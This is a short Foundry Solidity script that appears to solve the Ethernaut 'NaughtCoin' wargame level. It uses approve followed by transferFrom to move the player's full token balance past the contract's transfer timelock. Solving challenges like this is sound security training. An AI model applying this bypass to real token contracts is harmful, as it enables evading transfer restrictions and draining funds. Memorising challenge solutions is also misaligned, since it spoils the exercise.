// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "src/level15.sol";

contract POC is Script {
    NaughtCoin level15;

    function setUp() public {
        level15 = NaughtCoin(0xe4F493d5002e501d746eC76D863a0b9F3009Df15);
    }

    function run() public {
        vm.startBroadcast();
        level15.player();
        level15.decimals();
        level15.approve(msg.sender, 1000000000000000000000000);
        level15.balanceOf(msg.sender);
        level15.transferFrom(msg.sender, address(1), 1000000000000000000000000);
        level15.balanceOf(msg.sender);
        vm.stopBroadcast();
    }
}
